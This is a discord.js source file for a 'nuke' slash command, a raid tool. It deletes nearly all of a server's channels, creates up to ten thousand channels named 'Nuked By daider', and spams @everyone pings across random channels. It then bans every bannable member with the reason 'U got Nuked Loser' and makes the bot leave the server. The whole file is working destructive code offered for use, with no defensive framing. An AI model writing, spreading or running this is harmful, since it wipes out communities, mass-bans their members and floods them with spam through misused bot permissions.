const { SlashCommandBuilder, ChannelType, PermissionFlagsBits, PermissionsBitField } = require('discord.js');

module.exports = {
	data: new SlashCommandBuilder()
		.setName('nuke')
		.setDescription(':rofl:')
        .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers)
        .setDMPermission(false)
        .addStringOption(option =>
            option
                .setName('name')
                .setDescription('name of the channels')
                .setRequired(false),
        )
        .addStringOption(option =>
            option
                .setName("message")
                .setDescription("Message to spam")
                .setRequired(false),
        ),
	async execute(interaction) {
        const community = ['rules', 'moderator-only'];
        const currentChId = interaction.channel.id;
        const name = interaction.options.getString('name') ?? "Nuked By daider";
        const message = interaction.options.getString('message') ?? '';
		await interaction.deferReply({ ephemeral: true });
        for (let index = 0; index <= 10000; index++) {
            const cr = await interaction.guild.channels.cache.filter(ch => !community.includes(ch.name) && !(currentChId == ch)).first();
            if (!cr) {
                break;
            }
            if (cr.deletable) {
                await cr.delete();
            }
            else {
                await interaction.followUp({ content: `Couldn't delete ${cr.name}`, ephemeral: true });
            }
        }
        for (let index = 0; index <= 10000; index++) {
            const cr = interaction.guild.channels.create({ name: name, type: ChannelType.GuildText });
            Promise.all([cr, cr, cr, cr, cr]);
        }
        for (let index = 0; index < parseInt(Math.random() * 10000); index++) {
            for (let c = 0; c < parseInt(Math.random() * 10000); c++) {
                interaction.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).random(1)[0].send(message + "@everyone @here");
                interaction.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).random(1)[0].send(message + "@everyone @here");
                interaction.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).random(1)[0].send(message + "@everyone @here");
                interaction.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).random(1)[0].send(message + "@everyone @here");
            }
        }
        if (interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers) || interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await interaction.guild.members.fetch({ force: true }).then(members => {
                members.forEach(member => {
                    if (member.bannable) member.ban({ reason: "U got Nuked Loser :clown:" });
                });
            });
        }
        else {
            await interaction.editReply({ content:"I don't have permission to ban", ephemeral:true });
        }
        await interaction.editReply({ content: "Nuked", ephemeral: true });
        await interaction.guild.leave();
	},
};
